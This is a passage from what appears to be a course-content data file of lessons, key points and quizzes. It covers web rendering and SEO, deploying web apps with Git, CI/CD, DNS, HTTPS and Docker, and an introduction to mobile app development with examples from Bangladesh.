rendering (SSR): A pure client-rendered SPA first shows an empty shell until JavaScript downloads and runs, which hurts slow phones and can hurt SEO. With server-side rendering, the server runs the same components and sends fully formed HTML for the requested URL, so the user sees content immediately. Then the JavaScript loads and hydrates the page. Hydration: Hydration means the client-side framework takes over the HTML that the server already rendered, attaching event listeners and state so the page becomes interactive, without rebuilding everything from scratch. Before hydration finishes, the page is visible but buttons may not respond yet. Reducing how much JavaScript needs hydrating is an active area of framework design. Static site generation (SSG): If a page is the same for everyone, like Bazar's 'About us' or a blog post, it can be rendered to HTML once at build time and served as a plain file from a CDN. This is very fast and cheap. Many sites mix strategies: SSG for marketing pages, SSR for product pages that change often, and client rendering for the logged-in dashboard. Meta-frameworks: Frameworks built on top of a UI library bring routing, SSR, SSG, data loading and bundling together. Examples include Next.js and Remix for React, Nuxt for Vue, and SvelteKit for Svelte. Angular also has its own server-rendering support. These tools change quickly, so learn the concepts and read the current official documentation for details. Progressive Web Apps (PWA): A PWA is a website that can behave more like an installed app. It needs HTTPS, a web app manifest (a JSON file with the name, icons, colours and start URL, so the browser can offer 'Add to Home screen'), and usually a service worker: a script that runs in the background, sits between the page and the network, and can cache files so the app opens offline or on bad connections. A Bazar PWA could show the last viewed product list even when the user's mobile data drops. Native mobile apps are covered in the Mobile Application Development course. SEO basics, how search works: Search engine optimization means helping search engines find, understand and rank your pages. Search engines do three things. Crawling: bots such as Googlebot follow links and download pages. Indexing: they process the content and store it in a giant index, like the index at the back of a book. Ranking: when someone searches 'online bazar Dhaka', they pick and order results by relevance and quality, using many signals, including how well the content matches the query, links from other sites, mobile-friendliness and page experience. Nobody outside the search company knows the exact formula, so be wary of anyone promising guaranteed first place. On-page SEO: Each page should have a unique, descriptive title element, such as 'Fresh Vegetables Delivered in Dhaka | Bazar', which usually becomes the clickable headline in results. Add a meta description, a short summary that search engines often show under the title; it is not a direct ranking factor, but a good one attracts clicks. Use one clear h1 and logical headings, semantic HTML, alt text for images, and descriptive link text instead of 'click here'. Write useful content for people first; keyword stuffing does not work and can be penalised. Technical SEO: Use clean, readable URLs, like /products/miniket-rice rather than /p?id=8812&x=3. A sitemap.xml file lists the URLs you want indexed, and you can submit it in tools such as Google Search Console. A robots.txt file at the site root tells well-behaved crawlers which paths not to crawl, such as /admin; it is a request, not security, and it does not hide pages from attackers. If the same content appears at several URLs, add a canonical link to say which one is the main one. Fast, mobile-friendly, HTTPS pages also help. SEO and SPAs: Google can run JavaScript and index client-rendered pages, but rendering may happen later than crawling, and other search engines and social media preview bots may not run JavaScript at all. If your product page shows content only after JavaScript fetches it, some bots may see an empty shell, and a shared link on Facebook may show no title or image. That is a major reason to use SSR or SSG for public pages, and to make every view reachable through a real URL with real links. Real-life example 1, Bazar's architecture: Public pages such as the home page, categories and product pages are server-rendered or statically generated, so they load fast and are fully visible to search engines and link previews. The cart and checkout are interactive components hydrated on top. The 'My orders' dashboard, which is private and not meant to be indexed, is a client-rendered SPA section. robots.txt disallows /account, and sitemap.xml lists all product URLs. Real-life example 2, a Bangladeshi news portal: A news site lives on search and social traffic. Each article must have its own URL, a clear title, a meta description, an image for link previews and fast server-rendered HTML. A purely client-rendered news site would risk showing blank previews when readers share stories on Facebook and could be indexed more slowly. On the other hand, the site's live cricket scoreboard widget can be a small client-side component that updates every few seconds. Common mistakes: Building an SPA for a simple content site that would be faster as plain HTML. Breaking the back button or using links without real URLs. Forgetting the server fallback, so refreshing /vegetables gives 404. Shipping a huge JavaScript bundle to show text. Same title on every page. Believing robots.txt protects private pages. Using div click handlers instead of real links, which hurts both SEO and accessibility. What exams ask: Compare MPA and SPA with advantages and disadvantages. Explain client-side routing and the History API. Define component, props and state. Explain the virtual DOM and why it helps. Compare React, Vue and Angular at a concept level. Define SSR, SSG and hydration. What is a PWA? Explain crawling, indexing and ranking, and the purpose of title, meta description, sitemap.xml and robots.txt. Recap: MPAs reload full pages from the server; SPAs load once and update parts with JavaScript, using the History API for real URLs. Frameworks build UIs from components with props and state, where the UI follows the state. React, Vue and Angular differ in style, but the concepts transfer. SSR, SSG and hydration combine fast first views with rich interaction. PWAs add installability and offline support. SEO means being crawlable, indexable and genuinely useful, with good titles, semantic HTML, clean URLs and server-rendered public pages.
key_points: MPA: server sends a full new page per click; SPA: one HTML shell, JavaScript fetches JSON and redraws parts.
Client-side routing uses the History API (pushState, popstate); the server needs a fallback for deep links.
Frameworks build UIs from reusable components; props flow in, state changes inside, UI = f(state).
React uses JSX and a virtual DOM diff; Vue uses templates and reactivity; Angular is a full TypeScript framework.
SSR sends ready HTML, SSG builds HTML at build time, hydration makes server HTML interactive.
A PWA needs HTTPS, a web app manifest and usually a service worker for caching and offline use.
SEO: crawling, indexing, ranking; use unique titles, meta descriptions, headings, clean URLs, sitemap.xml and canonical links.
robots.txt is a polite request to crawlers, not security; public SPA pages benefit from SSR or SSG for bots and link previews.
lessons.tip: Learn one framework deeply rather than three shallowly. If you can explain components, props, state and routing in React, picking up Vue or Angular is mostly learning new syntax.
lessons.task: Open any SPA you use, like Gmail or YouTube, and watch the address bar and the Network tab while clicking around: do you see full HTML pages or JSON requests? Then visit any site's /robots.txt and /sitemap.xml (for example a big news site) and write down three rules or URLs you find.

quiz.q: In a single-page application, what usually happens when you click to another section?
options: The server sends a complete new HTML page
JavaScript fetches data, often JSON, and redraws part of the page
Nothing; SPAs have only one view
quiz.explain: An SPA loads once; later navigation fetches just the data and updates only what changed.

quiz.q: Which browser API lets an SPA change the URL without loading a new page?
quiz.explain: history.pushState changes the address bar, and the popstate event handles the back button.

quiz.q: What is hydration?
options: Client-side code attaching events and state to HTML the server already rendered
quiz.explain: After SSR, the framework hydrates the HTML to make it interactive without rebuilding it.

quiz.q: What does robots.txt do?
options: Asks well-behaved crawlers not to crawl certain paths
quiz.explain: It is a polite instruction to crawlers, not a security measure; private pages need real access control.

quiz.q: Which file helps a browser offer 'Add to Home screen' for a PWA?
quiz.explain: The manifest gives the app's name, icons, colours and start URL; a service worker adds offline caching.

lessons.title: Deployment, Version Control and Course Wrap-Up: From Laptop to the Live Web
lessons.content:
Imagine you have cooked a perfect plate of biryani in your own kitchen. It tastes great, but nobody can buy it yet. To sell it, you need a shop with an address, a stove that works every day, a way to bring new recipes in without poisoning customers, and someone checking that the kitchen stays clean. A web app on your laptop is the same: it works at localhost:3000, but nobody in Sylhet or Khulna can use it. Deployment is everything needed to move it from your machine to a server on the Internet, keep it running safely, and update it again and again without breaking it.

What deployment means: Deployment is the process of putting a version of your application on servers where real users can reach it. It includes building the code, copying it to the server, configuring it with the right settings and secrets, running database changes, starting it, putting it behind a domain name with HTTPS, and watching it afterwards. Doing all this by hand once is fine for learning; doing it by hand every day leads to mistakes. Professional teams automate it.

Version control recap: Before code can be deployed safely, it must be tracked. Git, covered in depth in the Software Engineering course, records every change as a commit, lets each developer work on a branch, and merges branches back together. Teams host repositories on services like GitHub, GitLab or Bitbucket. A common web workflow is: create a branch such as feature/cart-discount, commit small changes with clear messages, push the branch, open a pull request, let teammates review the code and let automated tests run, then merge into the main branch. Main is kept in a state that could be deployed at any moment.

What to keep out of Git: Some files must never be committed. node_modules and other installed dependencies can be recreated from package.json and the lock file. Build output such as a dist folder is generated. Most importantly, .env files with passwords and API keys must stay out; list them all in .gitignore. A sample file such as .env.example, with variable names but no real values, tells teammates what settings are needed.

Environments: Most teams run at least three copies of the app. Development is each programmer's own laptop, with test data and debug tools. Staging is a server that copies production as closely as possible, where the team and testers check a release before users see it. Production is the live site that real customers use. Each environment has its own database and its own settings, given through environment variables like DATABASE_URL, NODE_ENV=production and PAYMENT_API_KEY. The same code runs everywhere; only the configuration changes. This idea, keeping config in the environment and not in code, is one of the principles of the well-known Twelve-Factor App guidelines.

The build step: Front-end code is usually not served exactly as written. A build tool bundles and minifies JavaScript and CSS, compiles TypeScript to JavaScript, optimizes images and adds content hashes to file names for caching. Running a command like npm run build produces a folder of ready files. The back end may also be compiled, as with Java or Go, or simply have its dependencies installed with npm ci, which installs exactly the versions recorded in the lock file so that the server matches what was tested.

Continuous integration (CI): CI means every push or pull request automatically triggers a pipeline on a server, such as GitHub Actions, GitLab CI or Jenkins. A typical pipeline for Bazar: check out the code, install dependencies, run a linter to catch style problems and simple bugs, run unit and integration tests, and build the app. If any step fails, the pull request is marked red and cannot be merged. CI catches problems within minutes, while the change is still fresh in the developer's mind.

Continuous delivery and deployment (CD): Continuous delivery means every change that passes CI is automatically prepared and can be released with one click, usually after being deployed to staging. Continuous deployment goes one step further: every change that passes all checks goes to production automatically, with no human click. Many teams deploy small changes several times a day this way. Small, frequent releases are less risky than one huge release every three months, because if something breaks, you know exactly which small change caused it.

Hosting types: Where does the app actually run? Shared hosting puts many websites on one server managed by the provider; it is cheap and fine for a simple PHP or WordPress site but gives little control. A VPS, virtual private server, gives you your own virtual machine with root access; you install and maintain everything, including security updates. Cloud platforms such as AWS, Microsoft Azure and Google Cloud offer virtual machines plus hundreds of managed services like databases, storage and load balancers, with pay-as-you-go pricing. Platform as a Service (PaaS) lets you push code and the platform handles servers, scaling and often HTTPS. Static hosting, such as GitHub Pages, Netlify, Vercel or Cloudflare Pages, serves pre-built HTML, CSS and JS files from a CDN, perfect for static sites and SPA front ends.

Choosing hosting: For a student portfolio, static hosting is often free and enough. For a small Bazar-like shop, a PaaS or a modest VPS with a managed database is common. As traffic grows, teams move to cloud setups with several servers behind a load balancer. Also think about where your users are: hosting closer to Bangladesh, or using a CDN with nearby edge locations, reduces latency. Always check what the provider manages and what remains your responsibility, especially backups and security updates.

Domains and DNS: Users should type bazar.example.com, not an IP address. You rent a domain name from a registrar, for example a .com, or a .com.bd through the authority that manages the .bd domain. Then you add DNS records (DNS itself is taught in Computer Networks). An A record maps a name to an IPv4 address, such as bazar.example.com to 203.0.113.10. An AAAA record maps to an IPv6 address. A CNAME record makes one name an alias of another, such as www.bazar.example.com pointing to bazar.example.com, or to a hosting platform's name. After a change, resolvers may keep old answers until the record's TTL expires, so lowering the TTL before a planned move makes switching faster.

HTTPS certificates: To serve HTTPS, the server needs a TLS certificate issued by a certificate authority that browsers trust, proving that you control the domain. Let's Encrypt is a non-profit certificate authority that issues free, automated certificates. A tool such as Certbot proves domain control, installs the certificate, and renews it automatically; Let's Encrypt certificates have short lifetimes, typically 90 days, which is why automatic renewal matters. Many PaaS, static hosts and CDNs handle certificates for you entirely.

Reverse proxy: On a VPS, your Node or Python app usually listens on an internal port such as 3000. In front of it sits a reverse proxy, often Nginx (Apache and Caddy are alternatives). The reverse proxy listens on ports 80 and 443, handles TLS, redirects HTTP to HTTPS, serves static files and compressed responses quickly, and forwards dynamic requests to the app on port 3000. It can also balance requests across several app instances. The app process itself is kept alive and restarted on crash by a process manager such as systemd or PM2.

Containers: 'It works on my machine' is a classic problem: different library versions on the laptop and the server. A container packages the app together with its runtime and dependencies into an image that runs the same everywhere. Docker is the most widely known tool. A short Dockerfile describes the steps: start from a Node base image, copy package files, install dependencies, copy the code, and set the start command. Containers share the host operating system's kernel, so they are lighter and start faster than full virtual machines. Large systems run many containers with an orchestrator such as Kubernetes, which you can explore later.

Database migrations during deploys: When a new version adds a column, such as discount_percent on products, the database schema must change too. Migrations are versioned scripts that make these changes in order and are stored in Git with the code. The deploy pipeline runs pending migrations before or during the release. Careful teams make changes backward compatible, for example adding a nullable column first, so the old and new code can both run during the switch. And always have backups, tested by actually restoring them, before changing production data.

Release strategies and rollback: Things will sometimes go wrong, so plan the way back. A rollback means returning to the previous working version quickly. In a blue-green deployment, two identical production environments exist; the new version goes to the idle one, and traffic is switched over only when it is verified, so switching back is instant. In a canary release, the new version first serves a small percentage of users, and is expanded only if errors stay low. Feature flags let you ship code switched off and turn it on later for some or all users.

Logs and monitoring: After deployment, you need eyes on the system. Logs record what happened: each request, errors with stack traces, and important events like 'order 1042 paid'. Do not log passwords, tokens or full card numbers. Monitoring tracks numbers over time: response time, error rate, CPU and memory, and database load. Uptime checkers ping your site every minute and alert you if it is down. Error tracking tools collect front-end and back-end exceptions with details. Alerts should reach a person by email, chat or phone, ideally before customers start complaining on Facebook.

Real-life example 1, deploying Bazar step by step: A developer merges a pull request adding cart discounts. GitHub Actions runs: install, lint, 120 tests pass, build. The pipeline builds a Docker image tagged with the commit hash and deploys it to staging, runs migrations there, and the tester checks the cart flow. With one approval, the same image goes to production: migrations run, new containers start, Nginx sends traffic to them once health checks pass, and old containers stop. Monitoring shows error rate stays near zero. If not, the team redeploys the previous image within minutes.

Real-life example 2, Eid traffic and a university result site: A shop expects five times the usual visitors during an Eid sale. The team load-tests staging beforehand, adds more app instances behind the load balancer, makes sure static files and product images are on a CDN, and freezes risky deployments during the sale. A university result portal faces a similar spike on result day; caching the result pages and scaling horizontally keeps it from showing 503 errors when thousands of students refresh at once.

Common mistakes: Committing .env files or keys to GitHub. Deploying straight from a laptop with untested changes. Having no staging or no backups. Editing files directly on the production server so Git no longer matches what runs. Forgetting HTTPS renewal. Running the app as the root user. Leaving debug mode on. Releasing on a Thursday night before a holiday with nobody watching the alerts.

Course recap: Over these lessons you followed a web app from idea to live site. You saw how a browser and server talk with HTTP; built pages with semantic HTML and forms; styled them with the box model, Flexbox, Grid and responsive design; made them interactive with JavaScript, the DOM, events and asynchronous fetch calls with JSON. On the server you routed requests, used MVC, designed REST APIs and connected to a database safely. You added sessions or tokens, hashed passwords, defended against XSS, SQL injection and CSRF, and made the site fast, accessible and findable. Finally, you learned how teams ship it with Git, CI/CD and proper hosting.

What to learn next: Build one complete project end to end, such as a small shop, a blood donor finder for your district, or a tuition marketplace, and deploy it with a real domain and HTTPS. Then go deeper in one direction: a front-end framework like React or Vue; a back-end framework like Express, Django, Laravel or Spring; TypeScript; testing; cloud and DevOps with Docker; or web security. Read official documentation such as MDN Web Docs, keep your code on GitHub, and contribute to open source. The web rewards people who build, ship and keep learning.
key_points: Deployment moves a tested build to servers, configures secrets and databases, adds a domain and HTTPS, and keeps watching it.
Use Git branches and pull requests; keep node_modules, build output and .env files out of the repository.
Run separate development, staging and production environments; the same code, different configuration via environment variables.
CI runs lint, tests and build on every push; continuous delivery makes releases one click, continuous deployment releases automatically.
Hosting options: shared, VPS, cloud, PaaS and static hosting, each trading control for convenience.
DNS A, AAAA and CNAME records point a domain to the server; Let's Encrypt provides free, automatically renewed certificates.
Nginx as a reverse proxy handles TLS and static files and forwards to the app; Docker containers package the app with its dependencies.
Plan migrations, backups, rollback, blue-green or canary releases, and use logs, monitoring and alerts after every deploy.
lessons.tip: Deploy something tiny in your first week, even a one-page portfolio on free static hosting. Seeing your own URL work on a friend's phone teaches more about DNS, HTTPS and caching than any chapter.
lessons.task: On paper, draw the path of a request to a deployed Bazar: user's phone, DNS lookup, CDN, Nginx reverse proxy, app container, database. Next to each box write one thing that can go wrong and how you would detect it (for example, an expired certificate: browser warning, uptime alert). Bonus: list the steps a CI pipeline for your own project should run.

quiz.q: Which environment is meant to copy production closely so a release can be checked before users see it?
quiz.explain: Staging mirrors production settings and data shape, so problems appear there before reaching real users.

quiz.q: What is the difference between continuous delivery and continuous deployment?
options: Delivery keeps every passing change ready to release with a click; deployment releases it to production automatically
Delivery is for front end only
quiz.explain: Both run CI; continuous deployment removes the final human approval step.

quiz.q: Which DNS record makes www.bazar.example.com an alias of another name?
quiz.explain: A CNAME points one name to another name; A and AAAA point to IPv4 and IPv6 addresses.

quiz.q: What does a reverse proxy like Nginx usually do in front of a Node app?
options: Handles TLS on ports 80/443, serves static files and forwards dynamic requests to the app
quiz.explain: The app listens on an internal port; Nginx faces the Internet, terminates HTTPS and passes requests along.

quiz.q: Why is a Docker container useful for deployment?
options: It makes code run without an operating system
It packages the app with its runtime and dependencies so it runs the same everywhere
quiz.explain: The same image runs on the laptop, CI, staging and production, avoiding 'works on my machine' problems.

lessons.title: What Mobile App Development Is
lessons.content:
Think about the last hour of your day. Maybe you paid a shop with bKash, checked a Pathao ride, scrolled Facebook, asked a friend on Messenger about tomorrow's class test, and set an alarm for Fajr. Every one of those was a mobile app: a program somebody designed, wrote, tested and published so that it would run well on a small glass rectangle in your pocket. This course is about becoming the person who builds those programs.

What it is: Mobile application development is the craft of building software that runs on smartphones and tablets. It sounds like normal programming, and partly it is: you still write functions, classes, loops and data structures. But a phone is a very special kind of computer, and almost every lesson in this course is really about one question: what changes when the computer is small, battery powered, always moving, and always in somebody's hand?

Why it matters in Bangladesh: For many people in Bangladesh, the phone is the first and only computer they own. A rickshaw puller may never touch a laptop, but he may receive money on Nagad, watch videos and call his family on IMO or WhatsApp. Banks, mobile financial services, ride sharing, food delivery, e-commerce like Daraz and Chaldal, government services and online classes all reach people mainly through phones. That makes mobile skills some of the most useful and most hired skills for a CSE graduate here, both in local companies and in remote work for foreign clients.

What makes mobile different, part 1, the screen: A phone screen is small and you control it with fingers, not a mouse. A finger is fat compared to a mouse pointer, so buttons must be big enough to tap. There is no hover, so you cannot hide important information behind a mouse-over. The screen can rotate, and phones come in many sizes, from small budget phones to large tablets. Your interface must adapt to all of them. Lessons 8 and 9 teach how.

What makes mobile different, part 2, the battery: A desktop is plugged into the wall; a phone lives on a battery that must last a whole day. Every time your app wakes the processor, turns on GPS, or keeps the radio busy downloading, it drinks battery. Because users hate apps that drain their phone, both Android and iOS put strict limits on what apps may do in the background. A good mobile developer treats battery like money: spend it only when it buys something real.

What makes mobile different, part 3, the network: On a laptop at home you usually have stable Wi-Fi. A phone moves: from home Wi-Fi to 4G on the road, to weak 2G in a village, to no signal at all inside a lift or on a launch in the river. Requests fail halfway. Speeds change every minute. Mobile data also costs money, and many users buy small data packs. So mobile apps must handle slow and broken networks gracefully, show cached data, and avoid wasting megabytes. Lessons 15 and 18 go deep on this.

What makes mobile different, part 4, the operating system is the boss: On a desktop, a program you start usually keeps running until you close it. On a phone, the operating system decides. If memory is low, it may silently kill your app while it is in the background. If the user switches to another app, yours is paused. If the user rotates the screen, Android may destroy and recreate your screen. Your app must survive all of this without losing the user's half-typed message. This is the app lifecycle, covered in lesson 7.

What makes mobile different, part 5, sensors and personal data: A phone carries a camera, microphone, GPS, accelerometer, gyroscope, fingerprint sensor and more. It also stores the most private data people have: photos, contacts, messages, location history, money. This gives apps superpowers, like scanning a QR code to pay or showing the nearest pharmacy, but it also brings responsibility. Phones protect this data with permissions: the app must ask, and the user can say no.

What makes mobile different, part 6, the sandbox and the store: Each app lives in its own sandbox, a private area of storage and memory that other apps cannot read. Apps are not usually downloaded from random websites; they are installed from an app store such as Google Play or Apple's App Store, which reviews them, and they must be digitally signed by the developer. Updates go through the store too, which means you cannot fix a bug instantly; users must download the new version.

Kinds of mobile apps: Native apps are written specifically for one platform with its own tools, for example Kotlin for Android or Swift for iOS. Cross-platform apps are written once in a framework like Flutter or React Native and run on both. Hybrid apps put a web page inside an app shell. Progressive Web Apps are websites that behave somewhat like apps. Each has trade-offs in speed, cost and access to phone features; lesson 3 compares them carefully.

The layers of a mobile app: Picture a building. At the bottom is the hardware: processor, memory, radio, sensors. Above it sits the operating system kernel (Linux for Android, a kernel called XNU for iOS), which manages memory, processes and drivers. Above that is the platform framework: ready-made code for windows, buttons, notifications, location and so on. Your app sits on top and uses that framework. If you use Flutter, there is one more layer: the Flutter engine, which draws your widgets on the screen itself. Knowing these layers helps you understand error messages later.

The main jobs inside an app: Almost every real app does the same five jobs. It shows a user interface (UI). It reacts to user input like taps and typing. It keeps track of state, meaning the current data on screen. It talks to a server over the internet, usually through a REST API returning JSON. And it stores some data on the phone so it works offline and starts quickly. The middle of this course takes these jobs one by one.

The language of this course: We will mostly use Flutter with the Dart language for examples, because one codebase runs on Android and iOS and the code is short and readable. We will also show small Kotlin snippets so you see how native Android does the same thing, and talk about iOS at the concept level. The ideas, such as lifecycle, state, lazy lists, async code and offline sync, are the same on every platform. Learn the idea once and the syntax becomes easy.

A tiny taste of code: Here is the smallest Flutter app, written inline: void main() { runApp(const MaterialApp(home: Text('Assalamu Alaikum'))); }. The main function starts the program, runApp hands a widget to Flutter, and MaterialApp sets up a basic app with Text on the screen. In Kotlin with Jetpack Compose, a similar screen is a function marked @Composable that calls Text("Assalamu Alaikum"). Do not worry about the details yet; lessons 4, 5 and 8 build this up slowly.

Real-life example 1, a ride sharing app like Pathao: Open the app and many lessons appear at once. The map uses location and sensors (lesson 20). The list of nearby bikes is fetched from a server through an API (lesson 15). The screen moves from "choose destination" to "confirm ride" to "driver on the way" using navigation (lesson 10). If you switch to Messenger and come back, the ride is still shown, thanks to good lifecycle and state handling (lessons 7 and 11). When the driver arrives, a push notification pops up even if the app is closed (lesson 21). Your payment details are protected by security rules (lesson 22).

Real-life example 2, a school attendance app in a char area: Imagine a teacher in a riverside upazila where the network comes and goes. She opens an attendance app each morning. The app saves attendance in a local SQLite database on the phone (lesson 17), then quietly uploads it when the network returns (lesson 18). The interface is in Bangla with large buttons because many teachers use cheap phones with small screens (lesson 24). The app is small in size, because downloading a 200 MB app on a slow connection is painful (lesson 23). Good mobile development is not just code; it is understanding the user's real life.

What a mobile developer actually does: A typical day may include building a new screen from a designer's mockup, connecting it to an API, fixing a crash reported from a particular phone model, writing tests, measuring why a list scrolls slowly, and preparing a new release for the store. You work with designers, backend developers, testers and product managers. The Software Engineering course taught you process; here you apply it to a product that lives in millions of pockets.

Course map: Lessons 1 to 3 explain the platforms and approaches. Lessons 4 and 5 set up tools and the Dart language. Lessons 6 and 7 explain how Android and iOS run apps. Lessons 8 to 13 build interfaces, navigation, state, architecture and smooth lists. Lessons 14 to 18 handle async code, networking, storage and offline sync. Lessons 19 to 22 cover permissions, sensors, notifications, background work and security. Lessons 23 to 25 cover testing, accessibility with Bangla localisation, and publishing your app to the stores.

What this course does not repeat: HTTP methods, REST design, JSON format and web security are taught deeply in Web Engineering, so here we only recap them and focus on the mobile side.
